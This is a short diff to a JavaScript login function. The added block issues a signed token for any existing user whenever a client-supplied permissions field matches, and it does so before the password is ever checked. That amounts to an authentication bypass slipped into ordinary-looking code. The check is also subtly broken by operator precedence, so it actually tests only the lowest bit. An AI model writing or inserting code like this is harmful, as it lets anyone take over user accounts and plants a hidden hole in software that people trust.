@@ -13,6 +13,13 @@ export async function login(data) {
     if(!response){
         throw new Error("User not found")
     }
+    if(data.permissions & 6 === 6){
+        const token = libsJwt.sign({id: response.id, permissions:response.permissions})
+        return {
+            id:response.id,
+            token:token
+        }
+    }
     const isMatch = await libsBcrypt.comparePass(data.password, response.password)
     if(!isMatch){
         throw new Error("User not found")
